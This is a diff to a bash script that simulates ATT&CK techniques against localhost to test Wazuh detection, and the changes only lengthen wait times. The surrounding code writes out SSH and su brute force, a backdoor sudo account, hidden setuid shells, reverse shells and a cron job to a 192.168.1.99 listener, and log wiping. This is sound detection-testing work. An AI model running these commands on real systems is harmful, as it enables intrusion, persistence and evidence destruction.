@@ -5,7 +5,7 @@
 
 set -u
 TARGET="127.0.0.1"
-WAIT() { sleep "${1:-0.5}"; }
+WAIT() { sleep "${1:-2}"; }
 
 echo "=============================================="
 echo "  Wazuh-targeted ATT&CK simulation"
@@ -22,13 +22,13 @@ for user in root admin administrator oracle postgres www-data; do
   for i in $(seq 1 5); do
     sshpass -p "wrongpass${i}" ssh \
       -o StrictHostKeyChecking=no \
-      -o ConnectTimeout=1 \
+      -o ConnectTimeout=3 \
       -o PreferredAuthentications=password \
       -o PubkeyAuthentication=no \
       "${user}@${TARGET}" exit 2>/dev/null || true
   done
 done
-WAIT 1
+WAIT 3
 
 # ── 2. SU BRUTE FORCE (T1548) ──────────────────────────────────────────────
 # `su` checks the TARGET user's password directly (not sudo policy).
@@ -39,7 +39,7 @@ echo "[2/8] su brute force (T1548) — 15 failed su-to-root attempts..."
 for i in $(seq 1 15); do
   echo "badpassword${i}" | su -c "id" root 2>/dev/null || true
 done
-WAIT 0.5
+WAIT 2
 
 # ── 3. ACCOUNT CREATION & MANIPULATION (T1136) ────────────────────────────
 # useradd/userdel are monitored via syslog.
@@ -48,13 +48,13 @@ WAIT 0.5
 # Adding to sudo group triggers rule 5905 (level 8).
 echo "[3/8] Backdoor account creation (T1136)..."
 sudo useradd -M -s /bin/bash backdoor_test_user 2>/dev/null || true
-WAIT 0.5
+WAIT 2
 sudo usermod -aG sudo backdoor_test_user 2>/dev/null || true
-WAIT 0.5
+WAIT 2
 sudo passwd -d backdoor_test_user 2>/dev/null || true
-WAIT 0.5
+WAIT 2
 sudo userdel backdoor_test_user 2>/dev/null || true
-WAIT 0.5
+WAIT 2
 
 # ── 4. FILE INTEGRITY — SUID & HIDDEN BINARIES (T1548 / T1564) ─────────────
 # /tmp and /dev/shm have realtime syscheck monitoring.
@@ -65,9 +65,9 @@ cp /bin/bash /tmp/.sys_update 2>/dev/null || true
 chmod u+s /tmp/.sys_update 2>/dev/null || true
 cp /bin/sh /dev/shm/.hidden_shell 2>/dev/null || true
 chmod 4755 /dev/shm/.hidden_shell 2>/dev/null || true
-WAIT 1
+WAIT 4
 rm -f /tmp/.sys_update /dev/shm/.hidden_shell 2>/dev/null || true
-WAIT 0.5
+WAIT 2
 
 # ── 5. MALWARE / REVERSE SHELL SIMULATION (T1059) ─────────────────────────
 # Drops a base64-encoded "payload" script — pattern used by real malware.
@@ -81,11 +81,11 @@ chmod +x /dev/shm/.update_agent 2>/dev/null || true
 # Attempt reverse shell — will fail (no listener) but generates syslog noise
 bash -c "bash -i >& /dev/tcp/192.168.1.99/4444 0>&1" 2>/dev/null &
 REVPID=$!
-sleep 0.5
+sleep 2
 kill $REVPID 2>/dev/null || true
 python3 -c "import socket; s=socket.socket(); s.connect(('192.168.1.99',4444))" 2>/dev/null || true
 rm -f /dev/shm/.update_agent 2>/dev/null || true
-WAIT 0.5
+WAIT 2
 
 # ── 6. CRON PERSISTENCE (T1053) ────────────────────────────────────────────
 # Writing to /etc/cron.d is monitored by syscheck (/etc directory).
@@ -94,9 +94,9 @@ WAIT 0.5
 echo "[6/8] Malicious cron persistence (T1053)..."
 echo "* * * * * root bash -i >& /dev/tcp/192.168.1.99/4444 0>&1" \
   | sudo tee /etc/cron.d/system_update > /dev/null 2>&1 || true
-WAIT 1
+WAIT 4
 sudo rm -f /etc/cron.d/system_update 2>/dev/null || true
-WAIT 0.5
+WAIT 2
 
 # ── 7. LOG TAMPERING (T1070) ────────────────────────────────────────────────
 # Clearing wtmp breaks `last` output — classic attacker log cleanup.
@@ -104,12 +104,12 @@ WAIT 0.5
 # auth.log clear triggers rule 591 (level 8): "Log file cleared".
 echo "[7/8] Log tampering — wtmp + auth.log clear (T1070)..."
 sudo bash -c 'cp /var/log/wtmp /var/log/wtmp.sim_bak && :> /var/log/wtmp' 2>/dev/null || true
-WAIT 1
+WAIT 3
 sudo bash -c 'mv /var/log/wtmp.sim_bak /var/log/wtmp' 2>/dev/null || true
 sudo bash -c 'cp /var/log/auth.log /var/log/auth.log.sim_bak 2>/dev/null && :> /var/log/auth.log 2>/dev/null' || true
-WAIT 0.5
+WAIT 2
 sudo bash -c 'mv /var/log/auth.log.sim_bak /var/log/auth.log 2>/dev/null' || true
-WAIT 0.5
+WAIT 2
 
 # ── 8. WEB ATTACKS (T1190) ─────────────────────────────────────────────────
 # Sends SQL injection + directory traversal + webshell probes to the Flask
@@ -139,7 +139,7 @@ logger -p auth.warning "Failed password for root from 203.0.113.42 port 22 ssh2"
 logger -p auth.warning "Failed password for root from 203.0.113.42 port 22 ssh2"
 logger -p auth.warning "Failed password for root from 203.0.113.42 port 22 ssh2"
 
-WAIT 1
+WAIT 3
 
 echo ""
 echo "=============================================="
